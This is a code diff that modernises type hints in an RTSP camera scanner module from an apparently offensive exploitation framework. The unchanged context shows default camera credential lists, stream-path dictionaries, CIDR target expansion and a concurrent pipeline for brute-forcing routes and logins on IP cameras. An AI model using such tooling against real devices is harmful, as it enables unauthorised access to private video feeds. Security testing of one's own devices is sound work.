@@ -15,7 +15,6 @@ Version: 2.0.0
 # Authorized use only. See embedxpl.core.exploit.DISCLAIMER for full text.
 
 
-from __future__ import annotations
 
 import asyncio
 import base64
@@ -36,7 +35,7 @@ logger = logging.getLogger(__name__)
 
 # ── Embedded Route Dictionary (30+ common RTSP paths) ────────────────────────
 
-RTSP_ROUTES: List[str] = [
+RTSP_ROUTES: list[str] = [
     "/",
     "/live.sdp",
     "/live",
@@ -101,7 +100,7 @@ RTSP_ROUTES: List[str] = [
 
 # ── Embedded Credential Dictionary (20+ common pairs) ────────────────────────
 
-RTSP_CREDENTIALS: List[Tuple[str, str]] = [
+RTSP_CREDENTIALS: list[tuple[str, str]] = [
     ("", ""),
     ("admin", ""),
     ("admin", "admin"),
@@ -142,7 +141,7 @@ class _AuthType(IntEnum):
 
 
 # Banner → device model fingerprinting map
-_FINGERPRINTS: Dict[str, str] = {
+_FINGERPRINTS: dict[str, str] = {
     "hikvision": "Hikvision IP Camera",
     "dahua":     "Dahua IP Camera",
     "axis":      "AXIS Network Camera",
@@ -202,7 +201,7 @@ def _build_digest_auth(
     )
 
 
-def _parse_www_auth(header: str) -> Tuple[_AuthType, str, str]:
+def _parse_www_auth(header: str) -> tuple[_AuthType, str, str]:
     """Parse WWW-Authenticate header, return (auth_type, realm, nonce)."""
     if not header:
         return _AuthType.NONE, "", ""
@@ -227,7 +226,7 @@ def _raw_rtsp(
     port: int,
     request: str,
     timeout: float = 5.0,
-) -> Optional[str]:
+) -> str | None:
     """Send a raw RTSP request, return response text or None."""
     try:
         sock = socket.create_connection((host, port), timeout=timeout)
@@ -238,7 +237,7 @@ def _raw_rtsp(
             try:
                 sock.settimeout(max(0.1, deadline - time.monotonic()))
                 chunk = sock.recv(4096)
-            except socket.timeout:
+            except TimeoutError:
                 break
             if not chunk:
                 break
@@ -269,7 +268,7 @@ def _parse_www_authenticate(resp: str) -> str:
 
 # ── IP Target Expansion ───────────────────────────────────────────────────────
 
-def _expand_target(target: str) -> List[str]:
+def _expand_target(target: str) -> list[str]:
     """Expand a target spec (CIDR, range, IP, hostname) to list of IPs."""
     target = target.strip()
     # CIDR
@@ -331,7 +330,7 @@ class RtspScanResult:
     host: str
     port: int
     url: str = ""
-    credentials: Tuple[str, str] = ("", "")
+    credentials: tuple[str, str] = ("", "")
     device_model: str = ""
     auth_method: str = "none"
     route: str = ""
@@ -354,12 +353,12 @@ class RtspScanner:
         timeout:     Per-request socket timeout in seconds.
     """
 
-    DEFAULT_PORTS: List[int] = [554, 5554, 8554, 322, 8322]
+    DEFAULT_PORTS: list[int] = [554, 5554, 8554, 322, 8322]
 
     def __init__(
         self,
-        routes: Optional[List[str]] = None,
-        credentials: Optional[List[Tuple[str, str]]] = None,
+        routes: list[str] | None = None,
+        credentials: list[tuple[str, str]] | None = None,
         concurrency: int = 50,
         timeout: float = 4.0,
     ) -> None:
@@ -372,10 +371,10 @@ class RtspScanner:
 
     def scan_targets(
         self,
-        targets: List[str],
-        ports: Optional[List[int]] = None,
-        timeout: Optional[float] = None,
-    ) -> List[RtspScanResult]:
+        targets: list[str],
+        ports: list[int] | None = None,
+        timeout: float | None = None,
+    ) -> list[RtspScanResult]:
         """Scan a list of targets (IPs, CIDRs, hostnames) for open RTSP ports.
 
         Performs:
@@ -397,7 +396,7 @@ class RtspScanner:
             self.timeout = timeout
 
         # Expand all targets
-        all_ips: List[str] = []
+        all_ips: list[str] = []
         for t in targets:
             all_ips.extend(_expand_target(t))
 
@@ -415,8 +414,8 @@ class RtspScanner:
         self,
         host: str,
         port: int,
-        timeout: Optional[float] = None,
-    ) -> Optional[str]:
+        timeout: float | None = None,
+    ) -> str | None:
         """Brute-force RTSP route on a single host:port.
 
         Args:
@@ -442,8 +441,8 @@ class RtspScanner:
         host: str,
         port: int,
         route: str,
-        timeout: Optional[float] = None,
-    ) -> Optional[Tuple[str, str]]:
+        timeout: float | None = None,
+    ) -> tuple[str, str] | None:
         """Brute-force credentials for a specific RTSP route.
 
         Args:
@@ -468,13 +467,13 @@ class RtspScanner:
 
     # ── Async Pipeline ────────────────────────────────────────────────────────
 
-    async def _pipeline(self, ips: List[str], ports: List[int]) -> List[RtspScanResult]:
+    async def _pipeline(self, ips: list[str], ports: list[int]) -> list[RtspScanResult]:
         """Full async scan pipeline: port → route → creds."""
         sem = asyncio.Semaphore(self.concurrency)
         # Phase 1: port discovery
-        open_pairs: List[Tuple[str, str]] = []  # (ip, port)
+        open_pairs: list[tuple[str, str]] = []  # (ip, port)
 
-        async def _port_task(ip: str, port: int) -> Optional[Tuple[str, int]]:
+        async def _port_task(ip: str, port: int) -> tuple[str, int] | None:
             async with sem:
                 loop = asyncio.get_event_loop()
                 ok = await loop.run_in_executor(None, self._is_rtsp_port, ip, port)
@@ -489,9 +488,9 @@ class RtspScanner:
         logger.info("[RtspScanner] Phase 1: %d open RTSP ports", len(open_pairs))
 
         # Phase 2 + 3: route + credential brute-force
-        results: List[RtspScanResult] = []
+        results: list[RtspScanResult] = []
 
-        async def _attack_task(ip: str, port: int) -> Optional[RtspScanResult]:
+        async def _attack_task(ip: str, port: int) -> RtspScanResult | None:
             async with sem:
                 loop = asyncio.get_event_loop()
                 return await loop.run_in_executor(None, self._attack, ip, port)
@@ -536,7 +535,7 @@ class RtspScanner:
         port: int,
         route: str,
         timeout: float,
-    ) -> Tuple[_AuthType, str, str]:
+    ) -> tuple[_AuthType, str, str]:
         """Probe route and detect authentication method."""
         r = route if route.startswith("/") else "/" + route
         req = (
@@ -591,7 +590,7 @@ class RtspScanner:
             return False
         return _parse_rtsp_status(resp) == 200
 
-    def _attack(self, host: str, port: int) -> Optional[RtspScanResult]:
+    def _attack(self, host: str, port: int) -> RtspScanResult | None:
         """Run route + credential attack on a single host:port."""
         # Get banner
         req = f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: EmbedXPL/2.0\r\n\r\n"
@@ -679,10 +678,10 @@ class Exploit(BaseExploit):
     timeout = OptInteger(4, "Socket timeout per request (seconds)")
     concurrency = OptInteger(50, "Number of parallel scan workers")
 
-    def _targets(self) -> List[str]:
+    def _targets(self) -> list[str]:
         return [t.strip() for t in str(self.target).split(",") if t.strip()]
 
-    def _ports(self) -> List[int]:
+    def _ports(self) -> list[int]:
         p = int(self.port)
         if p == 0:
             return RtspScanner.DEFAULT_PORTS
